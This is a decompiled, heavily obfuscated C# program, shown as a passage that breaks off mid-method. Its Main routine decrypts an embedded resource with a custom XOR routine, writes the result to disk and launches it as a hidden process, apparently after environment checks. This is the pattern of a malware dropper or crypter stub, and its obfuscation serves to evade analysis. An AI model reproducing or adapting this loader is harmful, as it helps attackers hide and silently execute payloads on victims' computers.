using System;
using System.Collections;
using System.Diagnostics;
using System.Reflection;
using System.Resources;
using System.Security.Policy;
using System.Text;

internal sealed class Class40
{
	internal sealed class Class41
	{
		internal static byte[] smethod_0<T, U>(object object_0, object object_1, char char_0, short short_0) where T : Encoding where U : string
		{
			byte[] byte_ = default(byte[]);
			char[] char_ = default(char[]);
			Array int_ = default(Array);
			Array byte_2 = default(Array);
			int num = default(int);
			object int_2 = default(object);
			IList byte_3 = default(IList);
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			IEnumerable enumerable = default(IEnumerable);
			int num7 = default(int);
			try
			{
				byte_ = Class35.byte_1;
				char_ = Class45.char_0;
				while (true)
				{
					int_ = Class36.int_0;
					byte_2 = Class35.byte_0;
					num = 30;
					while (true)
					{
						int_2 = Class35.int_0;
						byte_3 = Class36.byte_0;
						num2 = 0;
						num = 20;
						while (true)
						{
							IL_0614:
							num = 21;
							while (true)
							{
								num3 = 0;
								num4 = (int_2 as int[])[238] - 30531;
								num2 = 12;
								num = 20;
								while (true)
								{
									IL_05e5:
									num = (int)byte_[46] / 6;
									while (true)
									{
										int num5;
										int num10;
										int num8;
										int num9;
										int num6;
										switch (num)
										{
										case 43:
											num2 = 12;
											num = byte_[84] - 120;
											continue;
										case 42:
											num2 = 12;
											num = char_[198] - 17407;
											continue;
										case 41:
											num5 = (byte_2 as byte[])[97];
											goto IL_004a;
										case 39:
											num2 = (int_ as int[])[214] - 16768;
											num = 20;
											goto case 20;
										case 13:
											num2 = (int_ as int[])[178] - 60273;
											num = 20;
											goto case 20;
										case 27:
											num10 = (int_2 as int[])[61] - 8361;
											goto IL_00ad;
										case 37:
											num4 = 0;
											num2 = (int_ as int[])[88] - 16557;
											num = 20;
											goto case 20;
										case 34:
											num10 = 6;
											goto IL_00ad;
										case 35:
											enumerable = Class45.smethod_5<string, Encoding>(object_0, object_1, 381, 382);
											num4 = 10;
											num = 13;
											goto case 13;
										case 20:
											switch (num2)
											{
											case 20:
												break;
											case 16:
												goto IL_0077;
											case 10:
												goto IL_0099;
											case 9:
												goto IL_00c7;
											case 7:
												goto IL_00e6;
											case 1:
												goto IL_00ed;
											default:
												goto IL_011a;
											case 3:
												goto IL_0180;
											case 4:
												goto IL_01ba;
											case 5:
												goto IL_01fc;
											case 6:
												goto IL_020e;
											case 8:
												goto IL_021d;
											case 11:
												goto IL_022f;
											case 14:
												goto IL_0244;
											case 15:
												goto IL_0256;
											case 17:
												goto IL_0268;
											case 19:
												goto IL_0285;
											case 13:
												goto IL_05d6;
											case 12:
												goto IL_05e5;
											case 0:
												goto IL_0614;
											case 2:
												goto IL_061a;
											case 18:
												goto IL_0649;
											}
											num = 39;
											goto case 39;
										case 2:
										case 28:
											switch (((char_0 ^ short_0) - 77) ^ num3)
											{
											default:
												num = char_[68] - 11117;
												continue;
											case 0:
												break;
											}
											num = 3;
											goto case 3;
										case 3:
											num8 = 19;
											goto IL_01ab;
										case 14:
											num4 = (((Array)byte_3) as byte[])[410] - 121;
											num2 = (int)(byte_2 as byte[])[392] / 9;
											num = char_[134] - 26733;
											continue;
										case 8:
											num9 = ((int[])int_2)[308] - 14539;
											goto IL_027e;
										case 40:
											num2 = ((byte[])byte_2)[228] - 174;
											num = byte_[236] - 18;
											continue;
										case 38:
											num9 = ((byte_3 as Array) as byte[])[220] - ((byte[])(Array)byte_3)[181];
											goto IL_027e;
										case 36:
											num3++;
											num7 = short_0 * short_0;
											num7 = short_0 + num7;
											num = char_[346] - 40602;
											continue;
										case 31:
											num5 = ((int[])int_)[112] - 50683;
											goto IL_004a;
										case 29:
											num5 = ((byte[])byte_2)[194] - 72;
											goto IL_004a;
										case 26:
											num8 = 17;
											goto IL_01ab;
										case 25:
											num6 = 7;
											goto IL_0335;
										case 24:
											num5 = 0;
											goto IL_004a;
										case 23:
											num5 = ((int[])int_)[189] - 36914;
											goto IL_004a;
										case 22:
											num5 = ((int[])int_)[199] - 20440;
											goto IL_004a;
										case 19:
											enumerable = null;
											num2 = 6;
											num = 20;
											goto IL_020e;
										case 16:
										case 18:
											if (num7 % 2 == 0)
											{
												num = 25;
												goto case 25;
											}
											num = byte_[97] - 196;
											continue;
										case 17:
											num5 = ((int[])int_)[49] - 56180;
											goto IL_004a;
										case 15:
											num5 = 4;
											goto IL_004a;
										case 12:
											switch (num4)
											{
											case 0:
												goto IL_0405;
											case 1:
												goto IL_040e;
											case 2:
												goto IL_0418;
											case 3:
												goto IL_0421;
											case 4:
												goto IL_042a;
											case 5:
												goto IL_043f;
											case 6:
												goto IL_0451;
											case 7:
												goto IL_0466;
											case 8:
												goto IL_046f;
											case 9:
												goto IL_0479;
											case 10:
												goto IL_048e;
											case 11:
												goto IL_0498;
											}
											num = char_[10] - 12549;
											continue;
										case 4:
											num5 = 9;
											goto IL_004a;
										case 10:
											num5 = 6;
											goto IL_004a;
										case 0:
											num5 = 11;
											goto IL_004a;
										case 9:
											num4 = ((byte[])(byte_3 as Array))[377] - ((byte[])(byte_3 as Array))[296];
											num = char_[294] - 49560;
											continue;
										case 7:
											num6 = (byte_2 as byte[])[222];
											goto IL_0335;
										default:
											num = byte_[244] - 91;
											continue;
										case 5:
											num5 = 9;
											goto IL_004a;
										case 1:
											num5 = (int_ as int[])[163] - 40998;
											goto IL_004a;
										case 11:
											num4 = 2;
											num2 = 12;
											num = 20;
											goto IL_05e5;
										case 21:
											break;
										case 30:
											goto end_IL_05f3;
										case 33:
											goto end_IL_061e;
										case 32:
											{
												return (byte[])((enumerable as ICollection) as Array);
											}
											IL_0498:
											num = 29;
											goto case 29;
											IL_048e:
											num = 0;
											goto case 0;
											IL_0479:
											num = char_[299] - 19531;
											continue;
											IL_046f:
											num = 10;
											goto case 10;
											IL_0466:
											num = 15;
											goto case 15;
											IL_0451:
											num = byte_[218] - 216;
											continue;
											IL_043f:
											num = char_[92] - 37599;
											continue;
											IL_042a:
											num = char_[223] - 6689;
											continue;
											IL_0421:
											num = 22;
											goto case 22;
											IL_0418:
											num = 41;
											goto case 41;
											IL_040e:
											num = 4;
											goto case 4;
											IL_0405:
											num = 24;
											goto case 24;
											IL_0335:
											num2 = num6;
											num = 20;
											goto case 20;
											IL_004a:
											num2 = num5;
											num = 20;
											goto case 20;
											IL_0649:
											num = 32;
											goto case 32;
											IL_061a:
											num = 30;
											goto end_IL_05f3;
											IL_05d6:
											num = 11;
											goto case 11;
											IL_0285:
											num = byte_[48] + 24;
											continue;
											IL_0268:
											num = 8;
											goto case 8;
											IL_027e:
											num4 = num9;
											goto case 43;
											IL_0256:
											num = byte_[231] - 103;
											continue;
											IL_0244:
											num = char_[12] - 43292;
											continue;
											IL_022f:
											num = char_[198] - 17391;
											continue;
											IL_021d:
											num = byte_[132] - 26;
											continue;
											IL_020e:
											num = byte_[197];
											continue;
											IL_01fc:
											num = char_[68] - 11127;
											continue;
											IL_01ba:
											num = 14;
											goto case 14;
											IL_0180:
											num = 2;
											goto case 2;
											IL_01ab:
											num2 = num8;
											num = byte_[3] * 2;
											continue;
											IL_011a:
											num = 39;
											goto case 39;
											IL_00ed:
											num = 35;
											goto case 35;
											IL_00e6:
											num = 34;
											goto case 34;
											IL_00c7:
											num = 37;
											goto case 37;
											IL_0099:
											num = 27;
											goto case 27;
											IL_00ad:
											num4 = num10;
											num2 = ((byte[])byte_2)[438] - 29;
											num = 20;
											goto case 20;
											IL_0077:
											num = 13;
											goto case 13;
										}
										break;
									}
									break;
								}
								continue;
								end_IL_05f3:
								break;
							}
							break;
						}
						continue;
						end_IL_061e:
						break;
					}
				}
			}
			catch (Exception exception_)
			{
				int num11 = default(int);
				int num12 = default(int);
				int num13 = default(int);
				Class25.smethod_11(exception_, new object[19]
				{
					num3, enumerable, num7, num11, num4, int_2, byte_3, num12, num2, int_,
					byte_2, num13, num, byte_, char_, object_0, object_1, char_0, short_0
				});
				throw;
			}
		}
	}

	public static byte[] smethod_0(byte[] byte_0, object object_0)
	{
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		object int_ = default(object);
		object byte_2 = default(object);
		int num = default(int);
		object byte_3 = default(object);
		ICloneable int_2 = default(ICloneable);
		int num2 = default(int);
		int num3 = default(int);
		int num8 = default(int);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			while (true)
			{
				int_ = Class36.int_0;
				byte_2 = Class35.byte_0;
				num = 17;
				while (true)
				{
					byte_3 = Class36.byte_0;
					int_2 = Class35.int_0;
					num2 = (int_ as int[])[2] - 20955;
					num = 16;
					while (true)
					{
						int num10;
						switch (num2)
						{
						case 15:
							num = char_[227] - 52535;
							goto IL_01cc;
						case 9:
							num = 12;
							goto IL_00a7;
						case 14:
							num = byte_[95] - 37;
							goto IL_01cc;
						case 13:
							num = 19;
							goto IL_0309;
						case 12:
							num = char_[312] - 58560;
							goto IL_01cc;
						case 11:
							num = byte_[99];
							goto IL_01cc;
						case 10:
							num = byte_[267] - 93;
							goto IL_01cc;
						case 8:
							num = char_[295] - 21873;
							goto IL_01cc;
						case 7:
							num = byte_[243] - 135;
							goto IL_01cc;
						case 6:
							num = byte_[7];
							goto IL_01cc;
						case 5:
							num = 6;
							goto IL_026b;
						case 4:
							num = char_[294] - 49588;
							goto IL_01cc;
						case 3:
							num = byte_[231] - 111;
							goto IL_01cc;
						case 2:
							num = byte_[255] - 115;
							goto IL_01cc;
						case 1:
							num = byte_[173] - 39;
							goto IL_01cc;
						case 0:
							num = 1;
							goto IL_025f;
						default:
							{
								num = 24;
								goto IL_01c1;
							}
							IL_01cc:
							while (true)
							{
								int num7;
								int num6;
								char num9;
								switch (num)
								{
								case 33:
									break;
								case 13:
								case 32:
									num7 = 14;
									goto IL_0033;
								case 31:
									num7 = 8;
									goto IL_0033;
								case 29:
									num7 = 8;
									goto IL_0033;
								case 28:
									num3 = checked(num3 + -1);
									num8 = 8;
									num = byte_[185] * 3;
									continue;
								case 26:
									num3 = checked(byte_0.Length * 2 + ((Array)object_0).Length);
									num = byte_[155] * 5;
									continue;
								case 25:
									goto IL_009e;
								case 12:
									goto IL_00a7;
								case 22:
									num7 = 13;
									goto IL_0033;
								case 21:
									num8 = 0;
									num2 = 4;
									num = char_[116] - 47451;
									continue;
								case 20:
									num7 = 13;
									goto IL_0033;
								case 14:
									switch (num8)
									{
									case 0:
										goto IL_0119;
									case 1:
										goto IL_0129;
									case 2:
										goto IL_0131;
									case 3:
										goto IL_0141;
									case 4:
										goto IL_0149;
									case 5:
										goto IL_0160;
									case 6:
										goto IL_0170;
									case 7:
										goto IL_0178;
									case 8:
										goto IL_0180;
									}
									num = 20;
									goto case 20;
								case 4:
									num7 = (byte_2 as byte[])[181] - 59;
									goto IL_0033;
								case 3:
									num7 = 2;
									goto IL_0033;
								case 0:
									num7 = 3;
									goto IL_0033;
								case 11:
									if (num3 >= 0)
									{
										num = char_[50] - 52660;
										continue;
									}
									num = 18;
									goto case 5;
								case 10:
									num7 = ((int[])int_)[46] - 62211;
									goto IL_0033;
								case 8:
									num7 = ((byte[])byte_2)[47];
									goto IL_0033;
								case 24:
									goto IL_01c1;
								case 1:
									goto IL_025f;
								case 2:
									num6 = 0;
									goto IL_0300;
								case 6:
									goto IL_026b;
								case 9:
								{
									int num4 = num3 % byte_0.Length;
									checked
									{
										int num5 = unchecked(byte_0[num3 % byte_0.Length] ^ ((byte[])object_0)[num3 % ((Array)object_0).Length]) - unchecked((int)byte_0[checked(num3 + 1) % byte_0.Length]) + 256;
										Class35.int_0[324] = unchecked(Class35.int_0[324] * Class36.byte_0[412]) & 0x4C;
										byte_0[num4] = (byte)unchecked(num5 % 256);
										num = 27;
										goto case 27;
									}
								}
								case 5:
								case 18:
									num6 = ((byte[])byte_2)[192] - (byte_2 as byte[])[186];
									goto IL_0300;
								case 19:
									goto IL_0309;
								case 27:
									num2 = ((byte[])byte_2)[268] - 111;
									num = 16;
									goto end_IL_042e;
								case 30:
									goto IL_034a;
								case 16:
									goto end_IL_042e;
								case 17:
									goto end_IL_042d;
								default:
									num = 15;
									goto end_IL_0475;
								case 15:
									goto end_IL_0475;
								case 7:
									{
										return byte_0;
									}
									IL_0300:
									num2 = num6;
									num = 16;
									goto end_IL_042e;
									IL_0180:
									num = 0;
									goto case 0;
									IL_0178:
									num = 3;
									goto case 3;
									IL_0170:
									num = 22;
									goto case 22;
									IL_0160:
									num = char_[227] - 52544;
									continue;
									IL_0149:
									num = 4;
									goto case 4;
									IL_0141:
									num = 13;
									goto case 13;
									IL_0131:
									num = char_[23] - 2888;
									continue;
									IL_0129:
									num = 31;
									goto case 31;
									IL_0119:
									num = byte_[93] - 218;
									continue;
									IL_0033:
									num2 = num7;
									num9 = char_[284];
									Class45.char_0[119] = (char)((Class45.char_0[119] ^ Class45.char_0[254]) & '\u0018');
									num = num9 - 8229;
									continue;
								}
								break;
							}
							goto IL_0025;
							IL_034a:
							num10 = 7;
							goto IL_034b;
							IL_0309:
							num8 = (byte_3 as byte[])[113] - 43;
							num2 = (byte_2 as byte[])[104] - 176;
							num = 16;
							break;
							IL_026b:
							num2 = ((byte[])byte_2)[220] - 184;
							num = 16;
							break;
							IL_025f:
							num10 = 2;
							goto IL_034b;
							IL_034b:
							num8 = num10;
							num2 = (int_ as int[])[49] - 56191;
							num = 16;
							break;
							IL_01c1:
							num2 = 15;
							num = 16;
							goto case 15;
							IL_009e:
							num2 = 9;
							num = 16;
							goto case 9;
							IL_00a7:
							num8 = ((int[])(int_2 as Array))[173] - 57207;
							goto IL_0025;
							IL_0025:
							num2 = 4;
							num = byte_[40];
							goto IL_01cc;
							end_IL_042e:
							break;
						}
						continue;
						end_IL_042d:
						break;
					}
					continue;
					end_IL_0475:
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			object obj = default(object);
			int num11 = default(int);
			int num12 = default(int);
			int num13 = default(int);
			Class25.smethod_11(exception_, new object[16]
			{
				obj, num3, num11, num8, byte_3, int_2, num12, num2, int_, byte_2,
				num13, num, byte_, char_, byte_0, object_0
			});
			throw;
		}
	}

	[STAThread]
	public static void Main()
	{
		char[] char_ = default(char[]);
		byte[] byte_ = default(byte[]);
		int num = default(int);
		Array int_ = default(Array);
		Array byte_2 = default(Array);
		int num2 = default(int);
		IEnumerable int_2 = default(IEnumerable);
		int num3 = default(int);
		object obj = default(object);
		object obj2 = default(object);
		object obj4 = default(object);
		object obj3 = default(object);
		object obj6 = default(object);
		object obj5 = default(object);
		try
		{
			if (!Class28.smethod_5() || !Class4.smethod_0())
			{
				return;
			}
			char_ = Class45.char_0;
			byte_ = Class35.byte_1;
			num = 3;
			while (true)
			{
				int_ = Class36.int_0;
				byte_2 = Class35.byte_0;
				num2 = 10;
				num = 32;
				while (true)
				{
					num = 19;
					while (true)
					{
						IL_0561:
						int_2 = Class35.int_0;
						num3 = 0;
						while (true)
						{
							IL_0548:
							num2 = (int_ as int[])[178] - 60274;
							num = 32;
							while (true)
							{
								IL_04f8:
								switch (num2)
								{
								case 17:
									num = 15;
									goto IL_03c1;
								case 7:
									num = 12;
									goto IL_0399;
								case 11:
									num = char_[214] - 48284;
									goto IL_02e3;
								case 16:
									num = 33;
									goto IL_00dc;
								case 15:
									num = 15;
									goto IL_03c1;
								case 14:
									num = byte_[206] - 148;
									goto IL_02e3;
								case 13:
									num = 35;
									goto IL_006f;
								case 12:
									num = 36;
									goto IL_0463;
								case 9:
									num = 17;
									goto IL_0414;
								case 8:
									num = 9;
									goto IL_0386;
								case 5:
									num = 14;
									goto IL_0257;
								case 4:
									num = 28;
									goto IL_03a4;
								case 3:
									num = 22;
									goto IL_020c;
								case 2:
									num = 23;
									goto IL_01e3;
								case 1:
									num = 4;
									goto IL_03cc;
								case 0:
									num = 8;
									goto IL_028a;
								default:
									num = char_[150] - 62847;
									goto IL_02e3;
								case 10:
									break;
								case 6:
									{
										num = 25;
										goto IL_058b;
									}
									IL_03c1:
									num3 = 3;
									num2 = 11;
									num = 32;
									goto case 11;
									IL_02e3:
									while (true)
									{
										int num4;
										switch (num)
										{
										case 37:
											Class46.Class47.Class48.smethod_3<ProcessStartInfo>(Class46.Class47.smethod_3<Process>((Process)obj, 261, 355), ProcessWindowStyle.Hidden, 985, 957);
											num2 = 2;
											num = byte_[159] - 149;
											continue;
										case 35:
											break;
										case 31:
											goto IL_009e;
										case 34:
											num4 = ((int[])int_)[147] - 10540;
											goto IL_00c8;
										case 33:
											goto IL_00dc;
										case 16:
											goto IL_00df;
										case 29:
											num4 = 13;
											goto IL_00c8;
										case 27:
											goto IL_00fa;
										case 26:
											switch (num3)
											{
											case 0:
												goto IL_015d;
											case 1:
												goto IL_0178;
											case 2:
												goto IL_0181;
											case 3:
												goto IL_0189;
											case 4:
												goto IL_0196;
											case 5:
												goto IL_01b1;
											case 6:
												goto IL_01c2;
											case 7:
												goto IL_01ca;
											case 8:
												goto IL_01d2;
											case 9:
												goto IL_01db;
											}
											num = char_[150] - 62848;
											continue;
										case 21:
											num4 = ((int[])int_)[134] - 53079;
											goto IL_00c8;
										case 10:
											num4 = 6;
											goto IL_00c8;
										case 20:
											num4 = (int_ as int[])[177] - 6873;
											goto IL_00c8;
										case 5:
											num4 = ((byte[])byte_2)[45];
											goto IL_00c8;
										case 7:
										case 24:
											num4 = 1;
											goto IL_00c8;
										case 6:
											num4 = 9;
											goto IL_00c8;
										case 0:
											num4 = 6;
											goto IL_00c8;
										case 23:
											goto IL_01e3;
										case 22:
											goto IL_020c;
										case 18:
											num4 = 3;
											goto IL_00c8;
										case 14:
											goto IL_0257;
										case 8:
											goto IL_028a;
										case 2:
											num4 = 5;
											goto IL_00c8;
										case 9:
											goto IL_0386;
										case 11:
											goto IL_0391;
										case 12:
											goto IL_0399;
										case 28:
											goto IL_03a4;
										case 15:
											goto IL_03c1;
										case 4:
											goto IL_03cc;
										case 13:
											goto IL_03f8;
										case 17:
											goto IL_0414;
										case 30:
											goto IL_0447;
										case 36:
											goto IL_0463;
										case 32:
											goto IL_04f8;
										case 1:
											goto IL_0548;
										case 19:
											goto IL_0561;
										default:
											goto end_IL_056d;
										case 25:
											goto IL_058b;
											IL_01db:
											num = 0;
											goto case 0;
											IL_01d2:
											num = 6;
											goto case 6;
											IL_01ca:
											num = 7;
											goto case 7;
											IL_01c2:
											num = 34;
											goto case 34;
											IL_01b1:
											num = 5;
											goto case 5;
											IL_0196:
											num = 20;
											goto case 20;
											IL_0189:
											num = byte_[185];
											continue;
											IL_0181:
											num = 29;
											goto case 29;
											IL_0178:
											num = 10;
											goto case 10;
											IL_015d:
											num = 21;
											goto case 21;
											IL_00c8:
											num2 = num4;
											num = byte_[191] - 141;
											continue;
										}
										break;
									}
									goto IL_006f;
									IL_058b:
									Class36.Class37.smethod_0<Process>(obj as Process, '\u0004', 34);
									return;
									IL_0463:
									num2 = ((byte[])byte_2)[17];
									num = 32;
									continue;
									IL_0414:
									obj = new Process();
									Class46.smethod_5<ProcessStartInfo, string>(Class46.Class47.smethod_3<Process>((Process)obj, 23, 113), (string)(IEnumerable)obj2, 519, 515);
									num = 30;
									goto IL_0447;
									IL_0447:
									num2 = ((int[])int_)[139] - 57982;
									num = 32;
									continue;
									IL_03cc:
									obj4 = (byte[])Class42.Class43.smethod_2<ResourceManager, string>(obj3 as ResourceManager, Class42.Class43.Class44.smethod_0(550274688, null, 4), 144, '\u0088');
									num = 13;
									goto IL_03f8;
									IL_03f8:
									num2 = ((int[])int_)[218] - 52127;
									num = 32;
									continue;
									IL_03a4:
									num3 = 4;
									num2 = 11;
									num = 32;
									goto case 11;
									IL_0391:
									num2 = 7;
									num = 32;
									goto case 7;
									IL_0399:
									num3 = 2;
									num2 = 11;
									num = 32;
									goto case 11;
									IL_0386:
									num3 = 8;
									num2 = 11;
									num = 32;
									goto case 11;
									IL_028a:
									obj6 = smethod_0(obj4 as byte[], (byte[])((obj5 as IEnumerable) as Array));
									Class46.Class47.Class49.smethod_2<string>((string)(obj2 as IEnumerable), (byte[])((obj6 as IEnumerable) as Array), 853, '\u0313');
									num = 27;
									goto IL_00fa;
									IL_0257:
									obj3 = new ResourceManager(Class42.Class43.Class44.smethod_0(550274696, null, 0), smethod_1(411, 'Ƥ'));
									num = char_[341] - 45924;
									goto IL_02e3;
									IL_020c:
									Class42.Class43.Class44.pXbwutinsr();
									obj2 = Class42.smethod_2<string, string>(Class42.Class43.smethod_0(482, 510), Class42.Class43.Class44.smethod_0(550274980, null, 2), 350, 370);
									num = char_[281] - 64891;
									goto IL_02e3;
									IL_01e3:
									num3 = ((int[])(Array)int_2)[188] - 33300;
									num = byte_[197] * 4;
									goto IL_02e3;
									IL_00fa:
									num2 = ((byte[])byte_2)[308] - 117;
									num = byte_[269] * 8;
									goto IL_02e3;
									IL_00dc:
									num3 = 7;
									goto IL_00df;
									IL_00df:
									num2 = 11;
									num = char_[281] - 64870;
									goto IL_02e3;
									IL_006f:
									obj5 = Class41.smethod_0<Encoding, string>(Class42.Class43.smethod_1('Ě', 'ć'), Class42.Class43.Class44.smethod_0(550274952, null, 5), 'Ǆ', 393);
									num = 31;
									goto IL_009e;
									IL_009e:
									num2 = 17;
									num = char_[232] - 65143;
									goto IL_02e3;
								}
								break;
							}
							break;
						}
						break;
					}
					continue;
					end_IL_056d:
					break;
				}
			}
		}
		catch (Exception object_)
		{
			int num5 = default(int);
			int num6 = default(int);
			int num7 = default(int);
			int num8 = default(int);
			int num9 = default(int);
			int num10 = default(int);
			int num11 = default(int);
			Class27.smethod_2(object_, new object[21]
			{
				obj5, obj6, obj, obj4, obj3, obj2, num5, num3, int_2, num6,
				num2, int_, byte_2, num7, num8, num9, num, char_, byte_, num10,
				num11
			});
		}
	}

	static Class40()
	{
		Class52.KPUgGmhz2nAeI();
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			Class42.Class43.Class44.pXbwutinsr();
		}
		catch (Exception exception_)
		{
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			Class25.smethod_6(exception_, num, num2, num3, num4, byte_, char_);
			throw;
		}
	}

	internal static Assembly smethod_1(int int_0, char char_0)
	{
		byte[] byte_ = default(byte[]);
		char[] char_ = default(char[]);
		object byte_2 = default(object);
		object int_ = default(object);
		int num = default(int);
		int num6 = default(int);
		int num2 = default(int);
		int num4 = default(int);
		object obj = default(object);
		object int_2 = default(object);
		object byte_3 = default(object);
		int num12 = default(int);
		int num7 = default(int);
		try
		{
			byte_ = Class35.byte_1;
			char_ = Class45.char_0;
			while (true)
			{
				byte_2 = Class35.byte_0;
				int_ = Class36.int_0;
				num = byte_[81] - 1;
				while (true)
				{
					int num11;
					int num3;
					int num9;
					int num8;
					int num5;
					switch (num)
					{
					case 47:
						num6 = 0;
						num2 = 7;
						goto case 10;
					case 10:
						num4 = 3;
						num = 27;
						goto IL_001d;
					case 45:
						obj = null;
						num2 = ((int[])int_2)[203] - 31233;
						num4 = (int_ as int[])[206] - 10295;
						num = byte_[225];
						continue;
					case 44:
						num4 = 3;
						num = char_[19] - 47535;
						continue;
					case 42:
						num4 = 18;
						num = 27;
						goto IL_007e;
					case 21:
						int_2 = Class35.int_0;
						num = 33;
						goto case 33;
					case 33:
						byte_3 = Class36.byte_0;
						num4 = 16;
						num = byte_[224] - byte_[81];
						continue;
					case 41:
						num11 = 3;
						goto IL_00ab;
					case 40:
						num11 = 6;
						goto IL_00ab;
					case 39:
						num3 = (byte_2 as byte[])[405] - 177;
						goto IL_00cd;
					case 38:
						num3 = 13;
						goto IL_00cd;
					case 37:
						num3 = (int)(byte_2 as byte[])[310] / 4;
						goto IL_00cd;
					case 36:
						num3 = 14;
						goto IL_00cd;
					case 35:
						num3 = 19;
						goto IL_00cd;
					case 34:
						num9 = (int_ as int[])[90] - 39295;
						goto IL_0109;
					case 17:
						if (7056 > num12 - num7 * 9)
						{
							num = 0;
							goto case 0;
						}
						num = 34;
						goto case 34;
					case 0:
						num9 = (int_ as int[])[100] - 47251;
						goto IL_0109;
					case 16:
					case 28:
						num2 = 7;
						num4 = ((int[])int_)[11] - 33134;
						num = 27;
						goto case 27;
					case 27:
						switch (num4)
						{
						case 3:
							break;
						case 18:
							goto IL_007e;
						case 1:
							goto IL_0110;
						case 14:
							goto IL_0116;
						default:
							goto IL_01bf;
						case 0:
							goto IL_01c8;
						case 2:
							goto IL_01da;
						case 4:
							goto IL_01ee;
						case 5:
							goto IL_0213;
						case 6:
							goto IL_0227;
						case 7:
							goto IL_0231;
						case 8:
							goto IL_0242;
						case 9:
							goto IL_029a;
						case 10:
							goto IL_02ae;
						case 11:
							goto IL_02c2;
						case 12:
							goto IL_02d0;
						case 13:
							goto IL_02db;
						case 15:
							goto IL_0302;
						case 16:
							goto IL_0316;
						case 17:
							goto IL_0326;
						case 19:
							goto IL_0337;
						case 20:
							goto IL_0355;
						case 21:
							goto IL_0396;
						case 22:
							goto IL_03aa;
						}
						goto IL_001d;
					case 32:
						num2 = 12;
						num4 = 3;
						num = 27;
						goto IL_001d;
					case 19:
						num2 = ((byte[])byte_3)[22] - (byte_3 as byte[])[33];
						num = byte_[81];
						continue;
					case 12:
						num8 = 0;
						goto IL_0236;
					case 6:
						switch (((int_0 ^ char_0) - 62) ^ num6)
						{
						default:
							num = byte_[94] - byte_[139];
							continue;
						case 0:
							break;
						case 1:
							num = char_[39] - 57987;
							continue;
						}
						num = 30;
						goto case 30;
					case 30:
						num5 = 15;
						goto IL_0274;
					case 11:
						obj = Class46.Class47.smethod_4('ș', 635);
						num2 = 4;
						num4 = 3;
						num = byte_[225];
						continue;
					case 4:
						num12 = 784;
						num4 = 14;
						num = byte_[134] * 9;
						continue;
					case 26:
					{
						int num10 = (int_2 as int[])[329];
						Class36.int_0[246] = (Class36.int_0[246] * Class35.byte_0[466]) & 0xC;
						num11 = num10 - 31690;
						goto IL_00ab;
					}
					case 31:
						num3 = 22;
						goto IL_00cd;
					case 29:
						num3 = ((byte[])byte_2)[17];
						goto IL_00cd;
					case 25:
						num3 = 10;
						goto IL_00cd;
					case 1:
					case 24:
						obj = Class46.Class47.smethod_4('ˌ', 686);
						num2 = ((byte[])byte_3)[15] - 77;
						num = byte_[106] - 67;
						continue;
					case 23:
						num8 = (byte_3 as byte[])[204] - 116;
						goto IL_0236;
					case 22:
						num4 = 3;
						num = byte_[225];
						continue;
					case 20:
						num5 = 21;
						goto IL_0274;
					case 18:
						num3 = ((byte[])byte_2)[35] - ((byte[])byte_2)[6];
						goto IL_00cd;
					case 14:
						num3 = ((int[])int_)[73] - 52220;
						goto IL_00cd;
					case 13:
						num3 = 8;
						goto IL_00cd;
					case 9:
						num3 = 10;
						goto IL_00cd;
					case 8:
						num3 = 4;
						goto IL_00cd;
					case 7:
						num6++;
						num7 = 560;
						num4 = ((int[])int_)[230] - 22860;
						num = 27;
						goto case 27;
					case 5:
						num5 = 20;
						goto IL_0274;
					case 3:
						switch (num2)
						{
						case 0:
							goto IL_04ee;
						case 1:
							goto IL_04f7;
						case 2:
							goto IL_0508;
						case 3:
							goto IL_0516;
						case 4:
							goto IL_051f;
						case 5:
							goto IL_0528;
						case 6:
							goto IL_0536;
						case 7:
							goto IL_053f;
						case 8:
							goto IL_0548;
						case 9:
							goto IL_0559;
						case 10:
							goto IL_0564;
						case 11:
							goto IL_056d;
						case 12:
							goto IL_0578;
						}
						num = char_[281] - 64877;
						continue;
					case 2:
						num3 = 6;
						goto IL_00cd;
					default:
						num = 43;
						break;
					case 43:
						break;
					case 15:
						{
							return (Assembly)obj;
						}
						IL_0578:
						num = 37;
						goto case 37;
						IL_056d:
						num = byte_[33] - 100;
						continue;
						IL_0564:
						num = 2;
						goto case 2;
						IL_0559:
						num = byte_[157];
						continue;
						IL_0548:
						num = char_[340] - 51880;
						continue;
						IL_053f:
						num = 13;
						goto case 13;
						IL_0536:
						num = 29;
						goto case 29;
						IL_0528:
						num = byte_[73] - 194;
						continue;
						IL_051f:
						num = 31;
						goto case 31;
						IL_0516:
						num = 38;
						goto case 38;
						IL_0508:
						num = char_[61] - 4665;
						continue;
						IL_04f7:
						num = char_[263] - 64354;
						continue;
						IL_04ee:
						num = 39;
						goto case 39;
						IL_0109:
						num4 = num9;
						num = 27;
						goto case 27;
						IL_03aa:
						num = byte_[110] - 118;
						continue;
						IL_0396:
						num = char_[198] - 17387;
						continue;
						IL_0355:
						num = 26;
						goto case 26;
						IL_0337:
						num = 4;
						goto case 4;
						IL_0326:
						num = char_[11] - 7825;
						continue;
						IL_0316:
						num = byte_[234] - 8;
						continue;
						IL_0302:
						num = char_[320] - 33021;
						continue;
						IL_02db:
						num = 11;
						goto case 11;
						IL_02d0:
						num = byte_[80];
						continue;
						IL_02c2:
						num = byte_[96] - 23;
						continue;
						IL_02ae:
						num = char_[206] - 63961;
						continue;
						IL_029a:
						num = char_[231] - 42182;
						continue;
						IL_0242:
						num = 6;
						goto case 6;
						IL_0274:
						num4 = num5;
						num = char_[302] - 1243;
						continue;
						IL_0231:
						num = 12;
						goto case 12;
						IL_0236:
						num2 = num8;
						num4 = 3;
						num = 27;
						goto IL_001d;
						IL_0227:
						num = byte_[7];
						continue;
						IL_0213:
						num = char_[168] - 58653;
						continue;
						IL_01ee:
						num = 19;
						goto case 19;
						IL_01da:
						num = char_[325] - 59342;
						continue;
						IL_01c8:
						num = 32;
						goto case 32;
						IL_01bf:
						num = 42;
						goto case 42;
						IL_0116:
						num = 17;
						goto case 17;
						IL_001d:
						num = byte_[134];
						continue;
						IL_0110:
						num = 16;
						goto case 16;
						IL_00cd:
						num4 = num3;
						num = byte_[225];
						continue;
						IL_00ab:
						num2 = num11;
						num4 = 3;
						num = 27;
						goto IL_001d;
						IL_007e:
						num = 21;
